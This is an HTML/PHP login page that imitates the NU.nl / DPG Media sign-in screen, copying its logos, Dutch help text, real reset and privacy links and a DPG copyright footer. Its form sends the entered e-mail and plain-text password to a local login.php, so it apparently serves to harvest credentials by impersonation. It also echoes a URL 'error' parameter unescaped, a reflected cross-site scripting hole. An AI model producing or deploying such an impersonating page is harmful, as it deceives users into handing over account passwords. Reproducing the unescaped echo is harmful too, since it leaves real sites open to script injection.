<!DOCTYPE html>
<html lang="nl">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log in</title>
    <link rel='stylesheet' href='log.css'>
    <script>
    function myFunction() {
        var dots = document.getElementById("dots");
        var moreText = document.getElementById("more");
        var btnText = document.getElementById("myBtn");

        if (dots.style.display === "none") {
            dots.style.display = "inline";
            btnText.innerHTML = "Read more";
            moreText.style.display = "none";
        } else {
            dots.style.display = "none";
            btnText.innerHTML = "Read less";
            moreText.style.display = "inline";
        }
    }
    </script>
</head>

<body>
    <div class="boven">

        <div class="icon">
            <a href="https://www.nu.nl"><img
                    src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACQAAAAkCAYAAADhAJiYAAAAAXNSR0IArs4c6QAAAM9JREFUWEft1mEKwyAMBeDXm6xH2VF20u0m7VFKQKGUjuhLMmXEP6WI9PMZtQsma8tkHiRIW5FMKBPSEtD6/76GHiWBXUviW79nQoLZAAjmWZ7dLi9QxVTAp6CGgK4YSegFQFDdzZqQK0b0FpA7xgIKwbCgMAwDCsWwoDeA8wFInzl3W5ApasGEoRiQTCwMxYLCUBZQCMoKckd5gO5QQy/Xuntrocv72n2rlgFeCZ1R9M8ZczCyE28e551Q84d/8QtrxuSStUSYNaSllAlpCR20sC4l41WsUwAAAABJRU5ErkJggg==" /></i>
            </a>
        </div>
        <div class="dpg">
            <a href="dpg" class="dpg">
                <img class="img" src="dpg.png" alt="svg">

            </a>
            <p>account</p>
        </div>
    </div>
    <hr>
    <div class="nu">
        <a href="nu" class="nu">
            <a href="https://www.nu.nl"><img class="img" src="Nu-nl-logo.png"></a>
        </a>
    </div>
    <form action="login.php" method="post">
        <h1>Log in of maak je account aan</h1>

        <?php if (isset($_GET['error'])){ ?>
        <p class="error"><?php echo $_GET['error']; ?></p>

        <?php } ?>

        <p>Vul je e-mailadres in.</p>
        <input type="text" name="uname" placeholder="E-mailadres">
        <input type="text" name="pass" placeholder="Password">
        <h1>
            <button type="submit">Ga verder</button>
        </h1>
    </form>
    <p>
        <a href="https://www.nu.nl/tvgids">Over DPG Media account ↓</a>
    </p>
    <div class="midden">
        <div class="hulp">
            <h2>Hulp bij inloggen</h2>
            <p><a href="https://login.dpgmedia.nl/password/reset?client_id=nu-site-web">Ik ben mijn wachtwoord
                    vergeten</a>
            </p>
            <p><a href="https://www.nu.nl/tvgids"></a></p>
            <p>Ik weet niet of ik al een account heb.<span id="dots">...</span><span id="more"> Vul hierboven je
                    e-mailadres
                    in en klik op 'Ga verder'. Zo kunnen we nagaan of je al een account hebt.

                    Wanneer blijkt dat je al een account hebt, dan kan je vervolgens je wachtwoord invullen of op
                    'Wachtwoord vergeten' klikken.
                    Wanneer blijkt dat je nog geen account hebt, dan kan je direct een account aanmaken. Het enige wat
                    je
                    hiervoor nog moet doen is een wachtwoord kiezen.</span></p>

        </div>
        <div class="meer">
            <button onclick="myFunction()" id="myBtn">Read more</button>
        </div>
    </div>
    <footer>
        <div class="footerlinks">
            <p><a href="https://privacy.dpgmedia.nl/nl/document/privacy-policy">Privacy-</a></p>
            <p><a
                    href="https://myprivacy.dpgmediagroup.net/consent?siteKey=tafjdbp1v2jwo1ff&callbackUrl=https%3A%2F%2Fwww.dpgmediagroup.com%2Fprivacygate-confirm%3FredirectUri%3D%252Fnl-NL%252Fcontact-dpgmedia">Klantenservice-</a>
            </p>
            <p><a
                    href="https://myprivacy.dpgmediagroup.net/consent?siteKey=tafjdbp1v2jwo1ff&callbackUrl=https%3A%2F%2Fwww.dpgmediagroup.com%2Fprivacygate-confirm%3FredirectUri%3D%252Fnl-NL%252Fcontact-dpgmedia">Gebruiksvoorwaarden</a>
            </p>

        </div>
        <div class="footerlinks">
            <p>© DPG Media B.V. - alle rechten voorbehouden</p>
        </div>
    </footer>

</body>

</html>